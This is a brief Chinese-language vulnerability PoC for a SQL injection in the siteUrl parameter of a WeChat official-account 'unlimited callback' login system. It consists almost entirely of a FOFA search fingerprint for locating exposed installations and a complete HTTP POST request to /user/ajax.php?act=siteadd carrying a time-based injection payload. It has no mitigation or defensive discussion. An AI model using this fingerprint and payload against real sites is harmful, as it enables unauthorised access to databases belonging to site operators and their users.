# 公众号无限回调系统接口siteUrl存在SQL注入漏洞

**微信公众平台无限回调系统是一个适用于H5游戏，H5网站，一切需要公众号登录接口的H5网站，且附带登录注册功能，接口/includes/class/user.class.php GetUrl方法存在SQL注入漏洞 **

## fofa

```yaml
"mb-5 web-font-desc"
```

## poc

```yaml
POST /user/ajax.php?act=siteadd HTTP/1.1
Host: 127.0.0.1
Cache-Control: max-age=0
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="101"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 27

siteUrl=';select sleep(5)#'
```

![image-20240712202339795](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407122023875.png)